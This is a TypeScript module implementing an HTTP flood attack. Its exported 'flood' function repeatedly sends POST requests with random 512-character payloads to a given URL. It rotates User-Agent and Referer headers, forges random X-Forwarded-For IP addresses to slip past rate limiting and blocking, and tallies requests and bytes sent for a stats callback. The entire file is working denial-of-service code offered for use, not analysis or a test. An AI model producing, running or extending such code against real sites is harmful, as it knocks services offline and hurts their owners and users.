import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const host = u.host
  const target = u.origin + u.pathname + u.search

  const run = async () => {
    for (let i = 0; i < rpc; i++) {
      try {
        const body = JSON.stringify({ data: randStr(512) })
        await fetch(target, {
          method: "POST",
          headers: {
            "User-Agent": randomChoice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Content-Length": String(body.length),
            "X-Requested-With": "XMLHttpRequest",
            "Referer": randomChoice(REFERERS) + target,
            "X-Forwarded-For": randIp(),
            "Connection": "keep-alive",
          },
          body,
          redirect: "manual",
        })
        onStats(1, target.length + body.length + 500)
      } catch {}
    }
  }

  await run()
}
